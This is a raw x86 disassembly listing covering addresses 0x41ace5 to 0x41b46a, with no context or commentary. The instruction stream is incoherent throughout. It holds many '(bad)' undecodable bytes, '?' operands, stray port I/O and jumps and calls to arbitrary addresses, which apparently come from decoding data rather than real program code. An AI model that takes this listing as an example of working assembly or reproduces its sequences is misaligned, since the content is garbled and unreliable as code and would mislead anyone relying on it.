  41ace5:	stos   BYTE PTR es:[edi],al
  41ace6:	xchg   BYTE PTR [ebx+0xf50e79a],dh
  41acec:	jnp    0x41acff
  41acee:	pop    es
  41acef:	sub    dl,BYTE PTR [eax-0xfa4923]
  41acf5:	xchg   esp,eax
  41acf6:	inc    ebp
  41acf7:	cdq    
  41acf8:	add    DWORD PTR [ebp+ecx*2+0x42],edx
  41acfc:	clc    
  41acfd:	ret    0xcae5
  41ad00:	mov    esp,0xfb505a0b
  41ad05:	inc    ecx
  41ad06:	pop    esp
  41ad07:	mov    ds:0x545f4a79,al
  41ad0c:	dec    esp
  41ad0d:	xchg   esi,eax
  41ad0e:	pop    es
  41ad0f:	push   0x4d0e61d2
  41ad14:	push   cs
  41ad15:	sub    DWORD PTR [ebp+0x7],ebx
  41ad18:	fbld   TBYTE PTR [ebp+ecx*8+0x41]
  41ad1c:	ins    BYTE PTR es:[edi],dx
  41ad1d:	dec    edi
  41ad1e:	fmulp  st(6),st
  41ad20:	xor    DWORD PTR ds:0x709061e0,0xffffffc3
  41ad27:	int    0xd5
  41ad29:	sar    ecx,cl
  41ad2b:	fidiv  WORD PTR [esi]
  41ad2d:	repnz xor bh,BYTE PTR [edi+ebx*8+0x2b062b3c]
  41ad35:	mov    esi,0x8a1adddf
  41ad3a:	fmul   QWORD PTR ds:0x1f064476
  41ad40:	dec    edx
  41ad41:	gs (bad) 
  41ad43:	out    0x5e,eax
  41ad45:	xchg   edx,eax
  41ad46:	popf   
  41ad47:	push   edi
  41ad48:	in     eax,0xdf
  41ad4a:	jno    0x41ad6a
  41ad4c:	out    dx,eax
  41ad4d:	and    al,0x6f
  41ad4f:	xchg   ecx,eax
  41ad50:	and    cl,0x5d
  41ad53:	mov    dh,0x31
  41ad55:	mov    ah,0x36
  41ad57:	push   cs
  41ad58:	jle    0x41ace5
  41ad5a:	jbe    0x41ad19
  41ad5c:	inc    esi
  41ad5d:	dec    ebp
  41ad5e:	out    dx,eax
  41ad5f:	xor    eax,0x77
  41ad62:	(bad)  
  41ad63:	fcompp 
  41ad65:	mov    esi,0xf3c96b51
  41ad6a:	cdq    
  41ad6b:	es xchg esp,eax
  41ad6d:	mov    cs,WORD PTR [eax]
  41ad6f:	jbe    0x41ad0d
  41ad71:	repz jne 0x41ada1
  41ad74:	sbb    bl,0x48
  41ad77:	jle    0x41ad9d
  41ad79:	aad    0x55
  41ad7b:	xor    DWORD PTR [ebx-0x65],ebp
  41ad7e:	jno    0x41add4
  41ad80:	mov    ebx,0xa3ccc3c
  41ad85:	pop    ebx
  41ad86:	mov    DWORD PTR [eax+0xdd3ee46],ebp
  41ad8c:	push   ecx
  41ad8d:	push   ecx
  41ad8e:	jge    0x41adb9
  41ad90:	cmp    ebx,ebx
  41ad92:	sahf   
  41ad93:	cdq    
  41ad94:	inc    DWORD PTR [eax-0x240cb551]
  41ad9a:	push   0x18
  41ad9c:	imul   edi,DWORD PTR es:[edx+0x1b48b879],0xa6201aa3
  41ada7:	ins    DWORD PTR es:[edi],dx
  41ada8:	cs cmp dl,cl
  41adab:	adc    BYTE PTR [edi],dh
  41adad:	cmp    ah,BYTE PTR [esi]
  41adaf:	sahf   
  41adb0:	(bad)  
  41adb1:	xchg   ebp,eax
  41adb2:	or     eax,0xd973838a
  41adb7:	aam    0x27
  41adb9:	and    eax,0x9b9621e6
  41adbe:	add    BYTE PTR [ecx+0xd4f2661],ch
  41adc4:	in     al,dx
  41adc5:	push   edx
  41adc6:	or     BYTE PTR [eax-0x50],0x79
  41adca:	mov    edi,0x545c4295
  41adcf:	xchg   esp,ebp
  41add1:	fist   DWORD PTR [ebx]
  41add3:	mov    ah,0x35
  41add5:	push   esp
  41add6:	xchg   edx,eax
  41add7:	and    esp,DWORD PTR [esi+0x23]
  41adda:	out    dx,al
  41addb:	rcr    DWORD PTR [esi+eiz*2-0x140937fe],cl
  41ade2:	adc    edx,ecx
  41ade4:	stc    
  41ade5:	dec    ebp
  41ade6:	pop    ebx
  41ade7:	rol    esi,cl
  41ade9:	adc    BYTE PTR [eax],ah
  41adeb:	(bad)  
  41aded:	inc    ebp
  41adee:	test   BYTE PTR [edx+0x43],bh
  41adf1:	iret   
  41adf2:	mov    dl,0xba
  41adf4:	xchg   ebp,eax
  41adf5:	mov    edx,0x52137874
  41adfa:	or     al,0xc0
  41adfc:	push   ss
  41adfd:	push   es
  41adfe:	addr16 jle 0x41ae30
  41ae01:	mov    BYTE PTR [esi],bl
  41ae03:	ja     0x41adda
  41ae05:	and    DWORD PTR [eax+0x7774eeec],0xe8c0dc38
  41ae0f:	fdivr  st(2),st
  41ae11:	sbb    ch,dl
  41ae13:	aas    
  41ae14:	sbb    DWORD PTR [edi],edx
  41ae16:	mov    ebp,0x4e6a27a
  41ae1b:	or     ebp,ebx
  41ae1d:	adc    edi,DWORD PTR [esi+0xb3d582a]
  41ae23:	fild   QWORD PTR [ebx-0x7d]
  41ae26:	outs   dx,DWORD PTR ds:[esi]
  41ae27:	mov    eax,ds:0x6fe0d694
  41ae2c:	add    eax,DWORD PTR [ecx-0xd4ce796]
  41ae32:	mov    ds:0x3cd592ec,eax
  41ae37:	mov    edi,0xb6e45261
  41ae3c:	add    dl,BYTE PTR [edi+esi*4]
  41ae3f:	loopne 0x41add2
  41ae41:	mov    dh,0xf1
  41ae43:	push   ecx
  41ae44:	(bad)  
  41ae46:	mov    WORD PTR [ebp+0x44],?
  41ae49:	scas   al,BYTE PTR es:[edi]
  41ae4a:	out    0x9b,al
  41ae4c:	ins    DWORD PTR es:[edi],dx
  41ae4d:	lea    ebp,fs:[esi+0x61]
  41ae51:	leavew 
  41ae53:	pushf  
  41ae54:	push   edx
  41ae55:	jae    0x41ae5c
  41ae57:	dec    ebp
  41ae58:	xchg   esi,eax
  41ae59:	jmp    DWORD PTR gs:[eax+0x4e]
  41ae5d:	push   eax
  41ae5e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ae5f:	mov    ds:0xcf8828d7,al
  41ae64:	into   
  41ae65:	jb     0x41ae38
  41ae67:	cld    
  41ae68:	xchg   ecx,ecx
  41ae6a:	push   0xe4e8ff08
  41ae6f:	stos   BYTE PTR es:[edi],al
  41ae70:	test   DWORD PTR [edi],0x291bfa95
  41ae76:	pop    ss
  41ae77:	push   edx
  41ae78:	into   
  41ae79:	test   BYTE PTR [ecx+0x4a],dh
  41ae7c:	sbb    bh,BYTE PTR [esi+0x41]
  41ae7f:	ja     0x41aed7
  41ae81:	xor    ch,BYTE PTR [eax]
  41ae83:	mov    es,WORD PTR [edi-0x29]
  41ae86:	adc    ebx,DWORD PTR [eax-0x77]
  41ae89:	mov    ah,0x44
  41ae8b:	scas   eax,DWORD PTR es:[edi]
  41ae8c:	add    al,BYTE PTR [ebp-0x75]
  41ae8f:	loope  0x41ae81
  41ae91:	push   esp
  41ae92:	jp     0x41ae25
  41ae94:	sub    esi,DWORD PTR [edx-0x50]
  41ae97:	jnp    0x41aecc
  41ae99:	jno    0x41ae48
  41ae9b:	sahf   
  41ae9c:	mov    al,0x6e
  41ae9e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ae9f:	inc    ecx
  41aea0:	loope  0x41aebc
  41aea2:	jo     0x41ae7f
  41aea4:	int    0xc3
  41aea6:	cdq    
  41aea7:	stc    
  41aea8:	add    BYTE PTR [edx-0x42],dh
  41aeab:	cwde   
  41aeac:	lods   al,BYTE PTR es:[esi]
  41aeae:	rcr    esi,1
  41aeb0:	ja     0x41af1b
  41aeb2:	mov    ch,ch
  41aeb4:	pop    ebx
  41aeb5:	pushf  
  41aeb6:	das    
  41aeb7:	jecxz  0x41aec4
  41aeb9:	jmp    edx
  41aebb:	out    0xed,al
  41aebd:	inc    eax
  41aebe:	xor    eax,0x4a7737c4
  41aec3:	pushf  
  41aec4:	inc    esi
  41aec5:	jecxz  0x41af09
  41aec7:	pop    eax
  41aec8:	fmul   st,st(0)
  41aeca:	out    0x71,eax
  41aecc:	pop    ss
  41aecd:	shld   DWORD PTR [eax],esi,0x35
  41aed1:	jnp    0x41ae71
  41aed3:	ss pop ecx
  41aed5:	inc    ebp
  41aed6:	adc    edi,esp
  41aed8:	pop    ss
  41aed9:	leave  
  41aeda:	ins    BYTE PTR es:[edi],dx
  41aedb:	ret    0xcd4e
  41aede:	pop    es
  41aedf:	xchg   edi,eax
  41aee0:	adc    BYTE PTR [ebx-0x4fc7d822],bl
  41aee6:	mov    cl,ah
  41aee8:	xor    al,0x74
  41aeea:	sub    al,0x6c
  41aeec:	fdivr  st,st(7)
  41aeee:	rcl    BYTE PTR [eax-0x48276522],0x37
  41aef5:	popf   
  41aef6:	pop    ss
  41aef7:	sbb    eax,DWORD PTR [edx]
  41aef9:	cmp    eax,0x54
  41aefc:	fild   DWORD PTR [ebp+0xc6b3055]
  41af02:	scas   al,BYTE PTR es:[edi]
  41af03:	add    esi,edi
  41af05:	outs   dx,BYTE PTR ds:[esi]
  41af06:	gs (bad) 
  41af08:	adc    bh,BYTE PTR [eax+0xc12f741]
  41af0e:	pop    es
  41af0f:	test   DWORD PTR [edx+0x70],esi
  41af12:	data16 clc 
  41af14:	push   ds
  41af15:	popa   
  41af16:	arpl   WORD PTR [eax],ax
  41af18:	or     dl,BYTE PTR [esi+0x321cd4c9]
  41af1e:	xchg   esi,eax
  41af1f:	aam    0xd7
  41af21:	sbb    esp,ecx
  41af23:	loop   0x41af8b
  41af25:	sbb    dh,BYTE PTR [edx+0x2e]
  41af28:	sbb    eax,0xc86bf4d
  41af2d:	sub    ah,BYTE PTR [esi-0x3bc52372]
  41af33:	sti    
  41af34:	fwait
  41af35:	gs mov ebp,0x6769d403
  41af3b:	adc    al,0x4b
  41af3d:	mov    esi,0x2dc663bc
  41af42:	retf   
  41af43:	adc    eax,0xe73f1e22
  41af48:	mov    edi,0x30a1ccca
  41af4d:	or     ebx,DWORD PTR [edi]
  41af4f:	mov    eax,0x4ef7e9c
  41af54:	sti    
  41af55:	repnz or BYTE PTR [ecx-0x7d02abe3],dl
  41af5c:	aad    0x48
  41af5e:	pop    edi
  41af5f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41af60:	aad    0xf4
  41af62:	xor    al,0x7f
  41af64:	push   ecx
  41af65:	cmp    eax,0x8e2eae21
  41af6a:	add    BYTE PTR [esi+0x3cdff6b],cl
  41af70:	in     eax,dx
  41af71:	xor    DWORD PTR [ecx-0x1c889294],ecx
  41af77:	cmp    BYTE PTR [ecx+eiz*2+0x54],dh
  41af7b:	inc    edx
  41af7c:	mov    edi,0xc6930515
  41af81:	popf   
  41af82:	inc    eax
  41af83:	loope  0x41af5e
  41af85:	inc    eax
  41af86:	fcom   DWORD PTR [ecx-0x39decfd9]
  41af8c:	in     al,dx
  41af8d:	daa    
  41af8e:	push   eax
  41af8f:	xchg   BYTE PTR [edx],bh
  41af91:	das    
  41af92:	js     0x41affa
  41af94:	xchg   ebx,eax
  41af95:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41af96:	push   0x43
  41af98:	mov    bh,0xab
  41af9a:	jecxz  0x41af53
  41af9c:	mov    ds:0xda887095,eax
  41afa1:	mov    ebx,es
  41afa3:	pop    ds
  41afa4:	or     ch,al
  41afa6:	imul   edi,DWORD PTR [ecx-0x70023f65],0xeb9fab54
  41afb0:	inc    esp
  41afb1:	dec    eax
  41afb2:	or     dl,BYTE PTR [esi+0x73f76f5d]
  41afb8:	scas   eax,DWORD PTR es:[edi]
  41afb9:	pop    ss
  41afba:	adc    ebx,DWORD PTR [edx-0x5d70ef15]
  41afc0:	(bad)  
  41afc1:	dec    esi
  41afc2:	jmp    0x41af5d
  41afc4:	out    dx,eax
  41afc5:	and    ebp,eax
  41afc7:	jmp    0x7c81:0xad8505f
  41afce:	jl     0x41af69
  41afd0:	repnz add edx,DWORD PTR [ebx]
  41afd3:	lock mov bh,ch
  41afd6:	fsub   DWORD PTR [ebp-0x30e0f7fc]
  41afdc:	adc    BYTE PTR [esi],bl
  41afde:	mov    ch,0x6a
  41afe0:	leave  
  41afe1:	lds    eax,FWORD PTR [edi+0xf]
  41afe4:	jae    0x41b028
  41afe6:	mov    dh,0xec
  41afe8:	sub    BYTE PTR [ebx],0xb2
  41afeb:	pop    es
  41afec:	ss je  0x41b011
  41afef:	xchg   ebx,eax
  41aff0:	out    0x71,al
  41aff2:	repz jmp 0x1991d824
  41aff8:	pushf  
  41aff9:	jae    0x41af85
  41affb:	imul   esp,DWORD PTR [ebx+ecx*1-0x5ce41604],0x5a
  41b003:	dec    edi
  41b004:	ss and eax,0xf3d79562
  41b00a:	jl     0x41afe6
  41b00c:	into   
  41b00d:	inc    edi
  41b00e:	les    esi,FWORD PTR [esi]
  41b010:	jecxz  0x41afc2
  41b012:	mov    di,0x79a4
  41b016:	and    al,0x9
  41b018:	jne    0x41afaf
  41b01a:	fidiv  DWORD PTR [esi+ebp*8+0x51c138f4]
  41b021:	mov    edx,DWORD PTR [esi+0x74]
  41b024:	dec    ebx
  41b025:	out    dx,al
  41b026:	add    BYTE PTR [ebx-0x3df585db],dl
  41b02c:	cmp    bl,BYTE PTR [eax]
  41b02e:	xchg   DWORD PTR [ecx-0x55d89537],ebp
  41b034:	add    al,0x6c
  41b036:	cmp    ch,BYTE PTR [eax-0x7c]
  41b039:	mov    esp,0xda267532
  41b03e:	in     eax,0xa
  41b040:	pop    esi
  41b041:	dec    esp
  41b042:	sub    ebx,esi
  41b044:	sub    al,0x79
  41b046:	mov    cl,0xce
  41b048:	mov    edi,0x8ee67fcf
  41b04d:	mov    ebp,0x923dfbf0
  41b052:	adc    esp,ebx
  41b054:	adc    eax,0xd532950
  41b059:	mov    ?,WORD PTR [eax-0x1746649]
  41b05f:	(bad)  
  41b060:	dec    ebp
  41b061:	mov    dh,0xb9
  41b063:	mov    bl,0xc0
  41b065:	adc    BYTE PTR [eax-0x2a7d277c],dh
  41b06b:	lods   eax,DWORD PTR ds:[esi]
  41b06c:	mov    al,0x5a
  41b06e:	mov    edx,0x732a69a0
  41b073:	add    eax,0xea8e1ec0
  41b078:	clc    
  41b079:	mov    eax,0x56a99f08
  41b07e:	pop    eax
  41b07f:	lods   eax,DWORD PTR ds:[esi]
  41b080:	push   cs
  41b081:	es dec cx
  41b084:	dec    esp
  41b085:	push   ebx
  41b086:	mov    eax,ds:0xfc2652d9
  41b08b:	leave  
  41b08c:	mov    ds:0xad76b760,eax
  41b091:	js     0x41b07f
  41b093:	or     cl,BYTE PTR [ecx-0x76]
  41b096:	inc    esp
  41b097:	adc    eax,0xafd2289a
  41b09c:	mov    BYTE PTR [edx+0x1c],0x6
  41b0a0:	ins    DWORD PTR es:[di],dx
  41b0a2:	jecxz  0x41b101
  41b0a4:	add    esp,DWORD PTR [esi+ecx*8-0x15764cb7]
  41b0ab:	mov    bl,0xd2
  41b0ad:	popf   
  41b0ae:	out    0xbc,eax
  41b0b0:	jnp    0x41b09e
  41b0b2:	enter  0x601b,0x1
  41b0b6:	mov    fs,WORD PTR [ebx+0x24907f70]
  41b0bc:	pusha  
  41b0bd:	aas    
  41b0be:	fcomi  st,st(6)
  41b0c0:	imul   BYTE PTR [esi]
  41b0c2:	pop    ebp
  41b0c3:	add    eax,0x71764147
  41b0c8:	xor    esp,DWORD PTR [esi]
  41b0ca:	mov    eax,ds:0x308e27fd
  41b0cf:	push   es
  41b0d0:	in     eax,0x38
  41b0d2:	dec    ebx
  41b0d3:	call   0x87645180
  41b0d8:	lods   eax,DWORD PTR ds:[esi]
  41b0d9:	out    dx,al
  41b0da:	xor    edi,DWORD PTR [edx]
  41b0dc:	mov    esi,0x717331c7
  41b0e1:	xchg   DWORD PTR [esi+0x7684370a],esi
  41b0e7:	rcl    BYTE PTR [eax-0x5e],1
  41b0ea:	xor    BYTE PTR ds:0x4ba9ea7,bh
  41b0f0:	push   edx
  41b0f1:	mov    dh,0xde
  41b0f3:	sti    
  41b0f4:	sbb    BYTE PTR [eax-0x73],ah
  41b0f7:	or     ch,al
  41b0f9:	and    DWORD PTR [ebx+0x4a63e52d],ebp
  41b0ff:	jmp    0xc93b179c
  41b104:	and    bh,BYTE PTR [ebx]
  41b106:	test   DWORD PTR [edi-0x60],edi
  41b109:	and    BYTE PTR [ecx+0x3b],cl
  41b10c:	test   BYTE PTR [edx-0x32],bl
  41b10f:	add    BYTE PTR [esi+0x6728b95c],dl
  41b115:	mov    bh,0x7f
  41b117:	fwait
  41b118:	mov    cl,ch
  41b11a:	into   
  41b11b:	mov    dh,0xc7
  41b11d:	mov    edx,0x324d4ea1
  41b122:	sub    al,0x4
  41b124:	(bad)  
  41b125:	pop    ebp
  41b126:	imul   esp,DWORD PTR [esi-0x5b],0xfffffff4
  41b12a:	add    edi,DWORD PTR [ecx*8+0x4f11da5b]
  41b131:	xchg   ch,ah
  41b133:	shrd   DWORD PTR [edx+0x19665155],esp,0x13
  41b13b:	sbb    al,0x96
  41b13d:	int3   
  41b13e:	xor    cl,BYTE PTR ds:0xf4e31fe9
  41b144:	cmp    al,0xc6
  41b146:	in     eax,dx
  41b147:	jge    0x41b0dc
  41b149:	scas   eax,DWORD PTR es:[edi]
  41b14a:	xchg   ebp,eax
  41b14b:	leave  
  41b14c:	ss mov ah,0xda
  41b14f:	add    ch,bl
  41b151:	inc    esp
  41b152:	js     0x41b12f
  41b154:	dec    eax
  41b155:	add    al,0xe4
  41b157:	pslld  mm2,QWORD PTR [eax]
  41b15a:	(bad)  
  41b15c:	adc    dl,BYTE PTR [eax]
  41b15e:	adc    ch,BYTE PTR [ebp+0x6b1f330a]
  41b164:	aam    0xd0
  41b166:	cmp    al,0x94
  41b168:	loop   0x41b11d
  41b16a:	mov    ecx,0xb1487569
  41b16f:	add    al,0xcb
  41b171:	leave  
  41b172:	fidivr WORD PTR [edi+0x5c]
  41b175:	mov    al,0xfb
  41b177:	add    BYTE PTR [ecx+0x34],ah
  41b17a:	mov    ds:0xd79140e7,al
  41b17f:	xor    bl,BYTE PTR [ebp+0x24]
  41b182:	lock aaa 
  41b184:	int    0x43
  41b186:	push   ebx
  41b187:	mov    BYTE PTR [ebp+0x4afba025],cl
  41b18d:	mov    gs,WORD PTR [ecx]
  41b18f:	jmp    0x41b16b
  41b191:	xor    ch,BYTE PTR [edi+eiz*2+0x45]
  41b195:	cmp    eax,0xcbae8b90
  41b19a:	xor    edx,DWORD PTR [ecx]
  41b19c:	enter  0xfd76,0x13
  41b1a0:	xor    ebx,DWORD PTR [edx]
  41b1a2:	mov    eax,ds:0x2f4edab3
  41b1a7:	inc    DWORD PTR [ebp+0x31]
  41b1aa:	test   DWORD PTR [ecx+0x10dea400],0xc8ee635
  41b1b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b1b5:	pusha  
  41b1b6:	pop    ds
  41b1b7:	adc    al,0x3c
  41b1b9:	rol    BYTE PTR [ecx],1
  41b1bb:	arpl   WORD PTR [edx],cx
  41b1bd:	cld    
  41b1be:	(bad)  
  41b1bf:	push   DWORD PTR [ecx+ecx*8]
  41b1c2:	and    ch,BYTE PTR [ebx-0x581a0df9]
  41b1c8:	outs   dx,BYTE PTR ds:[esi]
  41b1c9:	lock xor BYTE PTR cs:[ecx+ebx*4-0x536dfebd],ch
  41b1d2:	and    BYTE PTR ds:0x3a38b987,ah
  41b1d8:	shr    BYTE PTR [edx],cl
  41b1da:	mov    ch,0x62
  41b1dc:	mov    cl,0x5b
  41b1de:	stos   DWORD PTR es:[edi],eax
  41b1df:	sbb    eax,0xcb0915c9
  41b1e4:	shr    esi,cl
  41b1e6:	sub    BYTE PTR [eax],0xe9
  41b1e9:	pop    edi
  41b1ea:	lss    ecx,FWORD PTR [esi+0x78cee38a]
  41b1f1:	rcr    DWORD PTR [ebx+0x21440250],cl
  41b1f7:	jmp    0xda28f3bb
  41b1fc:	ret    0x8d9
  41b1ff:	jecxz  0x41b207
  41b201:	mov    WORD PTR [edi+0x35],fs
  41b204:	and    BYTE PTR [ecx],bl
  41b206:	adc    bh,BYTE PTR [edi+0x40]
  41b209:	push   esi
  41b20a:	paddusw mm0,QWORD PTR [ecx]
  41b20d:	stos   DWORD PTR es:[edi],eax
  41b20e:	ins    BYTE PTR es:[edi],dx
  41b20f:	repz out dx,al
  41b211:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b212:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b213:	mov    BYTE PTR [edi],dl
  41b215:	inc    ebx
  41b216:	mov    BYTE PTR [ecx],ah
  41b218:	pop    esi
  41b219:	ret    0xff28
  41b21c:	jae    0x41b28e
  41b21e:	test   DWORD PTR [ecx-0x990d676],ebp
  41b224:	cld    
  41b225:	ret    
  41b226:	in     al,dx
  41b227:	aad    0xad
  41b229:	cmp    BYTE PTR [eax],cl
  41b22b:	xchg   ecx,eax
  41b22c:	mov    DWORD PTR [esi],esi
  41b22e:	mov    esi,0x824cf19d
  41b233:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b234:	(bad)  
  41b235:	push   ebx
  41b236:	and    DWORD PTR [ebp-0xebf3719],edi
  41b23c:	cdq    
  41b23d:	cs push ss
  41b23f:	sbb    eax,DWORD PTR [ebx+0x23]
  41b242:	into   
  41b243:	daa    
  41b244:	fist   DWORD PTR [esi+0x11]
  41b247:	sbb    dh,BYTE PTR [eax+edi*1]
  41b24a:	mov    eax,ds:0xb183f307
  41b24f:	add    ebx,DWORD PTR [edi]
  41b251:	out    dx,eax
  41b252:	adc    ebp,esp
  41b254:	in     eax,dx
  41b255:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b256:	pop    edx
  41b257:	iret   
  41b258:	pop    es
  41b259:	mov    al,ds:0x11677329
  41b25e:	pop    ss
  41b25f:	mov    eax,ds:0xc245311a
  41b264:	repz dec esp
  41b266:	pop    edi
  41b267:	aad    0xb8
  41b269:	outs   dx,DWORD PTR ds:[esi]
  41b26a:	push   ecx
  41b26b:	cmp    ch,0x4c
  41b26e:	iret   
  41b26f:	and    BYTE PTR [eax+0x6fc5d42a],cl
  41b275:	ret    0xe5a4
  41b278:	dec    ecx
  41b279:	mov    DWORD PTR [ebx+0x675e74d5],esp
  41b27f:	or     al,0x4f
  41b281:	sahf   
  41b282:	cs cli 
  41b284:	mov    ch,cl
  41b286:	sub    edi,DWORD PTR [edi+0x72594e92]
  41b28c:	cwde   
  41b28d:	jae    0x41b2f6
  41b28f:	out    dx,al
  41b290:	push   ecx
  41b291:	clc    
  41b292:	cmc    
  41b293:	cmp    bh,BYTE PTR [edx-0x37e8d57c]
  41b299:	mov    ebp,DWORD PTR [edi-0x15]
  41b29c:	sti    
  41b29d:	fistp  WORD PTR [ebx+eiz*2+0x6b]
  41b2a1:	jge    0x41b2b0
  41b2a3:	popf   
  41b2a4:	xor    eax,0xe59273a9
  41b2a9:	jno    0x41b315
  41b2ab:	fs pop ss
  41b2ad:	push   0xffffffc9
  41b2af:	loope  0x41b31c
  41b2b1:	dec    ebp
  41b2b2:	xlat   BYTE PTR ds:[ebx]
  41b2b3:	call   0x4a64:0xf0c7ebe5
  41b2ba:	inc    ebp
  41b2bb:	(bad)  
  41b2bc:	jge    0x41b2a7
  41b2be:	idiv   ebx
  41b2c0:	mov    ebp,0x7d8dbd33
  41b2c5:	mov    ch,0x95
  41b2c7:	xchg   ebp,eax
  41b2c8:	mov    esp,0xbef82dfd
  41b2cd:	push   ecx
  41b2ce:	ret    
  41b2cf:	dec    ebp
  41b2d0:	or     eax,0xc4459f7f
  41b2d5:	mov    edi,0x42e25cde
  41b2da:	dec    edi
  41b2db:	ret    
  41b2dc:	jb     0x41b29e
  41b2de:	fs xchg ecx,eax
  41b2e0:	sahf   
  41b2e1:	or     al,0x7c
  41b2e4:	sti    
  41b2e5:	pop    ds
  41b2e6:	mov    ds:0xcab8dec2,eax
  41b2eb:	xchg   edx,eax
  41b2ec:	pop    es
  41b2ed:	test   DWORD PTR [eax],eax
  41b2ef:	mov    ?,edi
  41b2f1:	repz jge 0x41b367
  41b2f4:	les    ebp,FWORD PTR [ecx+0x1ba2f91b]
  41b2fa:	sbb    al,0x89
  41b2fc:	outs   dx,BYTE PTR ds:[esi]
  41b2fd:	gs das 
  41b2ff:	adc    bl,dh
  41b301:	xchg   BYTE PTR ds:0x69324b21,bl
  41b307:	sbb    al,0x3b
  41b309:	sub    BYTE PTR ds:[eax+0x230568f8],cl
  41b310:	cs das 
  41b312:	sbb    ecx,edi
  41b314:	and    DWORD PTR [ebp+0x47],ebx
  41b317:	retf   
  41b318:	mov    al,ds:0x31d28b8b
  41b31d:	in     eax,0xe7
  41b31f:	out    dx,eax
  41b320:	repz mov bl,0xcd
  41b323:	pusha  
  41b324:	jns    0x41b2c0
  41b326:	fild   QWORD PTR [ebx+edx*2-0x3f]
  41b32a:	xor    bh,BYTE PTR [eax+0x19]
  41b32d:	cmc    
  41b32e:	add    bh,BYTE PTR ds:0x4cd76745
  41b334:	shr    bh,cl
  41b336:	sub    BYTE PTR [edx],al
  41b338:	and    eax,0xbab6b0a7
  41b33d:	or     BYTE PTR [ebp-0x6f],cl
  41b340:	ret    
  41b341:	aam    0x48
  41b343:	fmulp  st(3),st
  41b345:	push   es
  41b346:	mov    edx,0x64b5ac1
  41b34b:	mov    ?,WORD PTR [ebx+ebp*2]
  41b34e:	test   eax,0xd4bc805a
  41b353:	out    dx,al
  41b354:	repz xor edi,DWORD PTR gs:[ecx]
  41b358:	add    al,0x24
  41b35a:	(bad)  
  41b35b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b35c:	push   esp
  41b35d:	push   0x5d
  41b35f:	adc    BYTE PTR [edx-0x7f],al
  41b362:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b363:	mov    ebx,0x442eeea5
  41b368:	jae    0x41b387
  41b36a:	(bad)  
  41b36b:	scas   eax,DWORD PTR es:[edi]
  41b36c:	ds into 
  41b36e:	push   0x22
  41b370:	sti    
  41b371:	call   0xff67e2e4
  41b376:	jmp    0x41b3ef
  41b378:	push   0x42fc5fca
  41b37d:	jbe    0x41b3e1
  41b37f:	adc    eax,DWORD PTR [esi]
  41b381:	mov    ebp,ds
  41b383:	push   eax
  41b384:	(bad)  
  41b385:	rol    BYTE PTR [eax],cl
  41b387:	ror    BYTE PTR [ecx-0x2eb16d7a],1
  41b38d:	adc    DWORD PTR [ebx],ecx
  41b38f:	ins    DWORD PTR es:[edi],dx
  41b390:	mul    DWORD PTR ds:0xfbed264
  41b396:	adc    DWORD PTR [edx],edx
  41b398:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b399:	xchg   esp,eax
  41b39a:	mov    ah,0x64
  41b39c:	(bad)  [esi+0x3bc5541d]
  41b3a2:	fldcw  WORD PTR [eax]
  41b3a4:	outs   dx,BYTE PTR ds:[esi]
  41b3a5:	add    eax,0x95923c0b
  41b3aa:	lods   al,BYTE PTR ds:[esi]
  41b3ab:	and    BYTE PTR [esi-0x55],0x98
  41b3af:	setb   BYTE PTR [ebp-0x77a07bd9]
  41b3b6:	adc    eax,0x26305e22
  41b3bb:	mov    eax,DWORD PTR [ecx]
  41b3bd:	xchg   ebp,eax
  41b3be:	cmp    esp,ebx
  41b3c0:	and    ebp,ebp
  41b3c2:	adc    eax,0xe87405ab
  41b3c7:	(bad)  
  41b3c8:	call   0xc94847bd
  41b3cd:	icebp  
  41b3ce:	out    dx,eax
  41b3cf:	dec    edi
  41b3d0:	mov    ebx,DWORD PTR [edx]
  41b3d2:	inc    edi
  41b3d3:	jmp    0x41b44b
  41b3d5:	pop    ss
  41b3d6:	imul   eax,DWORD PTR [ebx+ecx*4+0x7513dbcb],0xa54c1a8a
  41b3e1:	(bad)  
  41b3e2:	stos   DWORD PTR es:[edi],eax
  41b3e3:	or     eax,0xcf5b0810
  41b3e8:	imul   edx,DWORD PTR [edx-0x526845da],0x2dd66ba2
  41b3f2:	out    dx,eax
  41b3f3:	push   ds
  41b3f4:	and    BYTE PTR [ebx],bh
  41b3f6:	ins    DWORD PTR es:[edi],dx
  41b3f7:	adc    ecx,DWORD PTR [eax+0x31]
  41b3fa:	push   ebx
  41b3fb:	pop    ss
  41b3fc:	sub    ah,BYTE PTR [eax]
  41b3fe:	mov    ds:0xa6d54f21,eax
  41b403:	push   es
  41b404:	aaa    
  41b405:	fwait
  41b406:	jo     0x41b441
  41b408:	xor    bl,BYTE PTR [ecx-0x76257a34]
  41b40e:	push   ecx
  41b40f:	fisttp QWORD PTR [esp+eiz*2-0x6146a8c6]
  41b416:	cmp    al,BYTE PTR [ebx-0x2b]
  41b419:	mov    WORD PTR [ecx+esi*2],es
  41b41c:	or     BYTE PTR [eax+0x7a8fdfe4],0x19
  41b423:	inc    edx
  41b424:	into   
  41b425:	push   edi
  41b426:	sub    esi,ecx
  41b428:	or     al,bl
  41b42a:	aam    0xec
  41b42c:	push   ds
  41b42d:	push   0xe669cd92
  41b432:	and    BYTE PTR ds:0xd764624d,dl
  41b438:	mov    ebp,0x89689ab5
  41b43d:	lods   eax,DWORD PTR ds:[esi]
  41b43e:	mov    DWORD PTR [edx+0x5df146d7],esp
  41b444:	mov    ecx,0xe972f0e3
  41b449:	aas    
  41b44a:	xchg   bh,dl
  41b44c:	dec    esp
  41b44d:	inc    edx
  41b44e:	cmp    eax,0xafb35920
  41b453:	push   esp
  41b454:	and    DWORD PTR [ebp-0x19],eax
  41b457:	mov    ebx,0xdd77a8d1
  41b45c:	jns    0x41b46f
  41b45e:	and    esp,edx
  41b460:	and    cl,bh
  41b462:	test   BYTE PTR [esp+eiz*8-0x3bba5f85],dh
  41b469:	(bad)  
  41b46a:	nop
